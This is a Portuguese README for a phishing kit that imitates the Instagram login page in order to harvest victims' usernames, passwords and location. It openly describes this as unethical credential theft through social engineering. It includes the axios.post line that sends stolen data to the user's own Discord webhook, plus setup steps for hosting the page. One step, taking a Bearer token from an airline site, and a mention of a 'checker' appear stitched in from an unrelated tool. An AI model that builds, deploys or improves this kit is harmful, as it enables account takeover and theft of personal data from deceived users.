# 📷 Tela Fake Instagram

A **Tela Fake do Instagram** nada mais seria **um site idêntico ao site oficial**, porém usado de formas não éticas para obter credenciais de qualquer pessoa, desde que ela caia na sua engenharia social e faça a tentativa de login pelo site falso. Essa tela fake foi feita em **HTML** para **obter informações sobre a conta** + **localização** e **outros**!

## 📸 Exemplo de Interface

![img](img/exemple.png)

## 📩 Como recebo as informações?

- **Para receber o login, senha & outros coletados pelo Site Falso, é preciso ter um Servidor dentro do Discord**.
- **Abra o `index.html` e troque o exemplo pela sua `Webhook Válida`. Exemplo**:
  - `const response = await axios.post('https://discord.com/api/webhooks/exemplo/1nsaneqy', data);`
  - **Este código acima poderá ser encontrado na linha `258`**.

## 🖥 Consigo testar em minha máquina local?

Claro! Para testar a **Tela Fake** em seu computador, basta seguir esse processo:

1. Instale o [XAMPP](https://www.apachefriends.org/download.html)
2. Após a instalação, vá até o local onde o XAMPP foi instalado.
3. Dentro da pasta do XAMPP, procure por "htdocs".
4. Apague todo o conteúdo dentro, e cole a `index.html`.
5. Abra a `index.html` com o Bloco de Notas ou outro editor de texto (não se esqueça de trocar a webhook).
6. Vá até o site da **https://voeazul.com.br/** e capture o `Bearer`.
7. Abra o XAMPP, ligue o Apache, e no seu navegador vá até a [localhost](http://localhost/).
8. Pronto! O checker já está configurado para uso <3

## 💻 Quem fortaleceu o código foi:

- 1nsaneqy,
- Equipe Lean7!
